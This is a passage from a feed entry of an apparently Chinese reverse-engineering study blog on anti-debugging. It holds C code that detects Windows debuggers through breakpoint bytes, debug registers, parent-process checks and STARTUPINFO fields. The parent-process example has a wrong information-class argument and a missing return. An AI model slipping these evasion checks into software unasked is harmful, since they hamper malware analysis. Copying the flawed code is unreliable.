+</span><br><span class="line"><span class="keyword">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER) +</span><br><span class="line">(WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;</span><br><span class="line">DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">BOOL Found = FALSE;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">cld</span><br><span class="line">mov edi, dwAddr</span><br><span class="line">mov ecx, dwCodeSize</span><br><span class="line">mov al, <span class="number">0</span>CCH</span><br><span class="line">repne scasb; 在EDI指向大小为ECX的缓冲区中搜索AL包含的字节</span><br><span class="line">jnz NotFound</span><br><span class="line">mov Found, <span class="number">1</span></span><br><span class="line">NotFound:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> Found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于硬件断点，由于程序工作在保护模式下，无法访问硬件调试断点，所以一般需要构建异常程序来获取 DR 寄存器的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">CONTEXT context;</span><br><span class="line">HANDLE hThread = GetCurrentThread();</span><br><span class="line">context.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">GetThreadContext(hThread, &amp;context);</span><br><span class="line"><span class="keyword">if</span> (context.Dr0 != <span class="number">0</span> || context.Dr1 != <span class="number">0</span> || context.Dr2 != <span class="number">0</span> ||</span><br><span class="line">context.Dr3 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其他检测"><a href="#其他检测" class="headerlink" title="其他检测"></a><strong>其他检测</strong></h3><h4 id="判断父进程是否为-explorer-exe"><a href="#判断父进程是否为-explorer-exe" class="headerlink" title="判断父进程是否为 explorer.exe"></a><strong>判断父进程是否为</strong> <strong>explorer.exe</strong></h4><p>一般双击运行的进程的父进程都是 explorer.exe，但是如果进程被调试父进程则是调试器进程。也就是说如果父进程不是 explorer.exe 则可以认为程序正在被调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LONG status;</span><br><span class="line">    DWORD dwParentPID = <span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    PROCESS_BASIC_INFORMATION pbi;</span><br><span class="line">    <span class="type">int</span> pid = getpid();</span><br><span class="line">    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess =</span><br><span class="line">        (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleA(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtQueryInf</span></span><br><span class="line"><span class="string">            ormationProcess&quot;</span>);</span><br><span class="line">            status = NtQueryInformationProcess(hProcess, SystemBasicInformation,</span><br><span class="line">                (PVOID)&amp;pbi, <span class="keyword">sizeof</span>(PROCESS_BASIC_INFORMATION), <span class="literal">NULL</span>);</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bMore = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (bMore)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pbi.InheritedFromUniqueProcessId == pe32.th32ProcessID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stricmp(pe32.szExeFile, <span class="string">&quot;explorer.exe&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                CloseHandle(hProcessSnap);</span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                CloseHandle(hProcessSnap);</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bMore = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试-STARTUPINFO"><a href="#测试-STARTUPINFO" class="headerlink" title="测试 STARTUPINFO"></a><strong>测试</strong> <strong>STARTUPINFO</strong></h4><p>在使用 CreateProcess 创建进程时,需要传递 STARTUPINFO 的结构体指针，而常常我们并不会一个一个设置其结构的值，连把其他不用的值清 0 都会忽略。</p><p>故可以使用 GetStartupInfo 检查启动信息，如果很多值不为 0，那么就说明自己的父进程不是explorer（explorer.exe 使用 shell32 中 ShellExecute 来运行程序， ShellExecute 会清掉不用的值）</p><p>所以可以利用 STARTUPINFO 结构体中不用的字段来判断程序是否在被调试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckDebug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">STARTUPINFO si;</span><br><span class="line">GetStartupInfo(&amp;si);</span><br><span class="line"><span class="keyword">if</span> (si.dwX != <span class="number">0</span> || si.dwY != <span class="number">0</span> || si.dwFillAttribute != <span class="number">0</span> || si.dwXSize != <span class="number">0</span> ||</span><br><span class="line">si.dwYSize != <span class="number">0</span> || si.dwXCountChars != <span class="number">0</span> || si.dwYCountChars != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基于异常的反调试"><a href="#基于异常的反调试" class="headerlink" title="基于异常的反调试"></a><strong>基于异常的反调试</strong></h4><p>进程中发生异常时若 SEH 未处理或注册的 SEH 不存在，会调用 UnhandledExceptionFilter ，它会运行系统最后的异常处理器。 UnhandledExceptionFilter 内部调用了前面提到过的NtQueryInformationProcess 以判断进程是否正在被调试。</p><p>若进程未被调试，则运行最后的异常处理器。若进程处于调试状态，则将异常派送给调试器。</p><p>SetUnhandledExceptionFilter 函数可以修改系统最后的异常处理器。</p><h4 id="Debug-Block"><a href="#Debug-Block" class="headerlink" title="Debug Block"></a><strong>Debug Block</strong></h4><p>Debug Block 是指在需要保护的程序中，程序自身将一些只能同时有 1 个实例的功能占为己用。比如一般情况下，一个进程只能同时被 1 个调试器调试，那么就可以设计一种模式，将程序以调试方式启动，然后利用系统的调试机制防止被其他调试器调试。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;花指令-amp-反调试&quot;&gt;&lt;a href=&quot;#花指令-amp-反调试&quot; class=&quot;headerlink&quot; title=&quot;花指令&amp;amp;反调试&quot;&gt;&lt;/a&gt;花指令&amp;amp;反调试&lt;/h1&gt;&lt;p&gt;2024&amp;#x2F;01&amp;#x2F;17&lt;/p&gt;
&lt;p&gt;好，做道up</summary>
      
    
    
    
    
    <category term="花指令 逆向学习 反调试" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4-%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
</feed>
